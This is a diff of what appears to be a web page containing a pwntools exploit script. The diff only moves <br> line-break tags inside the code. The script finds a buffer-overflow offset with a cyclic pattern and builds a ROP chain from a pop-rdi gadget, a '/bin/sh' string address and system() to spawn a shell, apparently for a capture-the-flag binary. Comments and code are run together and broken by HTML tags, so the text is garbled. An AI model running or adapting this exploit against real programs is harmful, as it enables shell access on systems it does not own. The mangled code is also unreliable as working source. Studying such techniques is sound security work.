@@ -267,9 +267,9 @@ from pwn import *
  
 # activate logging context.log_level = 'debug' 
 
- # setup the 'found' addresses for our rop chain # the string to execute bin_sh = 0x600840 # the system call <br> system = 0x004006be # the instruction (gadget) to pop the string from the stack into rdi pop_rdi = 0x00400803 info("target<br> string: %#x", bin_sh) info("addr of system(): %#x", system) 
+ # setup the 'found' addresses for our rop chain # the string to execute bin_sh = 0x600840 # the system call <br> system = 0x004006be # the instruction (gadget) to pop the string from the stack into rdi pop_rdi = 0x00400803<br> info("target string: %#x", bin_sh) info("addr of system(): %#x", system) 
  
-# now let's find the offset automatically (we know it's 88 from doing it manually before but this finds it itself) # start a<br> process io = process(elf.path) 
+# now let's find the offset automatically (we know it's 88 from doing it manually before but this finds it itself)<br> # start a process io = process(elf.path) 
  
 # send a cyclic io.sendline(cyclic(128)) 
  
@@ -279,9 +279,9 @@ from pwn import *
  
 # read the stack point at the time of the crash stack = core.rsp info("stack: %#x", stack) 
  
-# read 4 bytes from the stack pointer # this is our De Bruijn offset pattern = core.read(stack, 4) offset = cyclic_find(pattern)<br> info("pattern: %r", pattern) 
+# read 4 bytes from the stack pointer # this is our De Bruijn offset pattern = core.read(stack, 4) offset = <br>cyclic_find(pattern) info("pattern: %r", pattern) 
  
-# build the rop chain # first we will return onto our pop gadget which will pop the next element on the stack, the address of our<br> '/bin/sh' string # then the return of that gadget pops the next address, which is our system call, and executes it  rop_chain = <br>p64(pop_rdi, endian="little") 
+# build the rop chain # first we will return onto our pop gadget which will pop the next element on the stack, the <br>address of our '/bin/sh' string # then the return of that gadget pops the next address, which is our system call, and executes it<br> rop_chain = p64(pop_rdi, endian="little") 
 
 rop_chain += p64(bin_sh, endian="little") rop_chain += p64(system, endian="little") 
  
